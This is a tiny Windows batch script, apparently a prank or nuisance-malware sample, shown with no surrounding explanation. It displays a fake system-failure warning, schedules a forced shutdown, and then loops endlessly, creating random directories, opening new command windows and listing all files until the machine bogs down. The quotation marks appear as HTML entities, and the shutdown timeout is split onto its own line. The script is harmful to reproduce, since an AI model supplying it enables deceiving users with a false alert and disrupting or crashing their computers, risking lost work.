@echo off
mode 200
color 1a
shutdown -s -c &quot;WINDOWS HAS DETECTED A SYSTEM FAILURE. SHUTTING DOWN TO PROTECT DATA.&quot; -t
30
:a
md %random%
start
dir /s
goto a
